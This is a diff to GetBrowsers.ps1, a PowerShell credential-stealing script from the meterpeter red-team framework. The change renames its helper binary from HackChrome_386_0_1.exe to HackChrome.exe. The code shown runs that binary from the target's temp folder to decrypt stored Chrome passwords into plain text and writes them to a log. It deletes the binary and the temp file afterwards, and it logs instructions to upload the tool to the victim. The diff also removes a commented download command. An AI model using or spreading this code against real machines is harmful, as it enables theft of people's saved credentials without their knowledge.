@@ -4,7 +4,7 @@
 
   Author: r00t-3xp10it (SSA RedTeam @2020)
   Required Dependencies: IE, Firefox, Chrome
-  Optional Dependencies: mozlz4-win32.exe, HackChrome_386_0_1.exe
+  Optional Dependencies: mozlz4-win32.exe, HackChrome.exe
   PS Script Dev Version: v1.18
 
 .DESCRIPTION
@@ -22,10 +22,10 @@
    mozlz4-win32 requires to be uploaded to $env:tmp folder for GetBrowsers.ps1 to use it.
    url: https://github.com/r00t-3xp10it/meterpeter/tree/master/mimiRatz/mozlz4-win32.exe
 
-   HackChrome_386_0_1.exe (Optional Dependencie)
+   HackChrome.exe (Optional Dependencie)
    Used to uncrypt chrome browser stored credentials to plain text
-   HackChrome_386_0_1 requires to be uploaded to $env:tmp folder for GetBrowsers to use it.
-   url: https://github.com/r00t-3xp10it/meterpeter/tree/master/mimiRatz/HackChrome_386_0_1.exe
+   HackChrome requires to be uploaded to $env:tmp folder for GetBrowsers.ps1 to use it.
+   url: https://github.com/r00t-3xp10it/meterpeter/tree/master/mimiRatz/HackChrome.exe
 
 .EXAMPLE
    PS C:\> ./GetBrowsers.ps1
@@ -823,16 +823,15 @@ function CREDS_DUMP {
     }
 
     ## Leak chrome creds
-    # Invoke-WebRequest -Uri "https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/HackChrome_386_0_1.exe" -OutFile "$env:tmp\HackChrome_386_0_1.exe"
-    If(Test-Path "$env:tmp\HackChrome_386_0_1.exe"){
+    If(Test-Path "$env:tmp\HackChrome.exe"){
         $IPATH = pwd
-        cd $env:tmp;./HackChrome_386_0_1.exe > $env:tmp\leakcreds.txt
+        cd $env:tmp;./HackChrome.exe > $env:tmp\leakcreds.txt
         $storecreds = Get-Content "$env:tmp\leakcreds.txt"|findstr /I /V /C:"Total Auth:"
         echo "`n`n[ Chrome ]" >> $LogFilePath\BrowserEnum.log
         echo "`nLeaking Chrome Creds" >> $LogFilePath\BrowserEnum.log
         # Remove old files
-        If(Test-Path "$env:tmp\HackChrome_386_0_1.exe"){
-            Remove-Item "$env:tmp\HackChrome_386_0_1.exe" -Force
+        If(Test-Path "$env:tmp\HackChrome.exe"){
+            Remove-Item "$env:tmp\HackChrome.exe" -Force
             Remove-Item "$env:tmp\leakcreds.txt" -Force
         }
         echo $storecreds >> $LogFilePath\BrowserEnum.log
@@ -841,9 +840,9 @@ function CREDS_DUMP {
         echo "`n`n[ Chrome ]" >> $LogFilePath\BrowserEnum.log
         echo "`nLeaking Chrome Creds" >> $LogFilePath\BrowserEnum.log
         echo "--------------------" >> $LogFilePath\BrowserEnum.log
-        echo "{Upload: meterpeter\mimiRatz\HackChrome_386_0_1.exe to target `$env:tmp}" >> $LogFilePath\BrowserEnum.log
+        echo "{Upload: meterpeter\mimiRatz\HackChrome.exe to target `$env:tmp}" >> $LogFilePath\BrowserEnum.log
         echo "{And Execute: [ ./GetBrowsers.ps1 -CHROME ] to leak chrome credentials}" >> $LogFilePath\BrowserEnum.log
-        echo "{https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/HackChrome_386_0_1.exe}" >> $LogFilePath\BrowserEnum.log
+        echo "{https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/HackChrome.exe}" >> $LogFilePath\BrowserEnum.log
     }
     
     ## Search for passwords in { ConsoleHost_history }
